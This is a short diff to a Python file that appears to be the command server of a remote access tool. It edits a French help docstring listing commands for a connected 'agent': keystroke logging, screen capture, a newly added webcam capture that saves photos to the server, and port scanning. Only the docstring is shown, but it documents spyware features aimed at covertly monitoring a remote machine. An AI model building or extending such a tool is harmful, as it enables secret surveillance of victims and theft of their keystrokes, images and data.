@@ -15,7 +15,8 @@ def handle_connection(connection, address):
         Commandes disponibles:
         - exit : Ferme la connexion avec le client.
         - keylog : Affiche les frappes enregistrées par le keylogger.
-        - screenshot : Prend une capture d'écran du client et l'enregistre sous le nom 'screen.png'.
+        - screenshot : Prend une capture d'écran de l'agent et l'enregistre sur la machine serveur.
+        - webcam : Prend une photo sur la machine de l'agent et l'enregistre sur la machine serveur.
         - scan <start_port> <end_port> : Effectue un scan des ports dans la plage spécifiée.
         - help : Affiche cette aide.
         """
